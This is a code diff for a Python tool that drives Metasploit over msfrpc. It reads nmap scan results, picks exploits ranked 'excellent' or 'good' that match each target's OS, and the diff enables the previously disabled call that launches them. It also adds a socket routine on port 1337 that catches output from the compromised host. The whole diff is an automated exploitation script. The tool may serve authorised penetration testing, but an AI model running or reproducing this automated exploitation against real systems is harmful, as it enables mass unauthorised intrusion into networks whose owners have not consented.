@@ -2,11 +2,12 @@ import packages
 from network import msfrpc
 import time
 import sys
+import socket
 
 # Object for the msfrpc client
 client = None
 
-def initiate(data):
+def initiate(data,host):
     print('Initiating msfrpc session')
     ip = "127.0.0.1"
     user = "msf"
@@ -19,11 +20,11 @@ def initiate(data):
         print('msfrpc session failed. Did you load the msgrpc plugin and set the password accordingly?')
         sys.exit(1)
     for target in data:
-        find_exploits(data[target], target)
+        find_exploits(data[target], target, host)
 
 # data: dict of nmap scan results from current target
 # target: ip address of the current target
-def find_exploits(data, target):
+def find_exploits(data, target, host):
     print('Starting exploit on ' + target)
     console = client.create_console()
     # Get the console id
@@ -51,7 +52,7 @@ def find_exploits(data, target):
         # print(res)
         exploits = analyze(target, res, os)
         for exp in exploits:
-            exploit(target, port, exp)
+            exploit(target, port, exp, host)
     client.destroy_console(con_id)
 
 def normalize_exploits(exp):
@@ -72,7 +73,7 @@ def analyze(target, exp, os):
         # if not ('exploit' in line or 'excellent' in line):
         # if (all(x in line for x in ['exploit', 'excellent', 'good'])) and any(x in line for x in [os,'multi']):
         if('exploit' in line and any(x in line for x in ['excellent', 'good']) and any(x in line for x in [os,'multi'])):
-            name = line.strip().split(' ', 1)[0].split('/')[-1]
+            name = line.strip().split(' ', 1)[0]
             ret.append(name)
             print(line)
     return ret
@@ -80,6 +81,21 @@ def analyze(target, exp, os):
 # target: ip address of current target
 # port: port for current exploit
 # exploit: Name of current exploit
-def exploit(target, port,exploit):
-    #client.run_module('exploit', exploit, target, port)
-    pass
+def exploit(target, port, exploit, host):
+    print('Exploiting {}'.format(exploit))
+    print(client.run_module('exploit', exploit, target, port, host))
+    listen_ncat(target,port)
+
+def listen_ncat(target, port):
+    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+    listener.bind(('', 1337))
+    listener.connect((target,port))
+    #sock, addr = listener.accept()
+    time.sleep(1)
+    while True:
+        data = listener.recv(1024)
+        if not data: break
+        print(data)
+    listener.shutdown(socket.SHUT_RDWR)
+    listener.close()
